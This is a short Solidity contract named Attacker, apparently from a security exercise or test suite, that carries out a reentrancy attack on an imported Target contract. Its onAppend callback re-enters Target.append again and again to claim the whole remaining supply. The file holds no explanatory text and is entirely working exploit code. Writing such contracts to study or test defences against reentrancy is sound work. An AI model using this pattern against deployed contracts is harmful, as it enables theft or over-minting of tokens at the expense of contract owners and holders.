// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Target.sol";

contract Attacker is IAttacker {
  uint256 public initial = 20;
  uint256 public intCounter = initial;

  function getMaxSupply(address target) public view returns (uint256) {
    return Target(target).maxSupply();
  }

  function getLength(address target) public view returns (uint256) {
    return Target(target).getLength();
  }

  function getAvailable(address target) public view returns (uint256) {
    uint256 _maxSupply = getMaxSupply(target);
    uint256 _length = getLength(target);
    if (_length > _maxSupply) {
      return 0;
    }
    return _maxSupply - _length;
  }

  function startAttacking(address target) external {
    uint256 available = getAvailable(target);
    Target(target).append(address(this), available);
  }

  function _reEntrancing() internal returns (bool) {
    uint256 available = getAvailable(msg.sender);
    if (available > 0) {
      Target(msg.sender).append(address(this), available);
    }
    return true;
  }

  function onAppend() external override returns (bool) {
    return _reEntrancing();
  }
}
